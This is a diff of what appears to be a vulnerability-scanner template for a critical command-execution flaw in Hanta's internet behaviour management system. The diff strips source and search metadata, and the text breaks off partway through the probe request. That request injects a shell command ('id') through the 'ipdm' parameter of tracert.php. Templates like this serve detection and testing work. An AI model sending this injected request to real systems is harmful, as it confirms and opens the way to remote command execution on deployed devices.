@@ -3,12 +3,8 @@ info:
   name: 上海汉塔网络科技有限公司 上网行为管理 tracert 存在命令执行漏洞
   author: hacktwo
   severity: critical
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/sx1hagm1k1zbtglm'
+  description: ''
   tags: rce,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: sx1hagm1k1zbtglm
-    fofa: app=”汉塔科技上网行为管理系统”
 http:
 - raw:
   - 'GET /dgn/dgn_tools/tracert.php?ipdm=2;id; HTTP/1.1
